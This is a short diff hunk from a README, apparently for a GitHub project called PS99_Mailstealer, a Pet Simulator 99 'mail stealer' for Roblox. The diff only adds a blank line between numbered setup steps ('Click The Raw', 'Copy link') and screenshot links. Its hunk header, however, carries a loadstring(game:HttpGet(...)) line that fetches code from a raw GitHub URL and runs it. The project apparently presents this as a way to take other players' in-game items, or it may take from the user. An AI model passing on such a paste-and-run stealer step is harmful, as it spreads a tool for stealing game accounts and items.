@@ -24,6 +24,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailsteale
 ![image](https://github.com/KiuuP/PS99_Mailstealer/assets/158788963/90c49e9a-0167-4e35-b611-0cf826fc518d)
 
 6:And Click The Raw
+
 ![image](https://github.com/KiuuP/PS99_Mailstealer/assets/158788963/746039ee-1b0d-47b3-8f38-1b4e6adf8483)
 
 7: Copy link
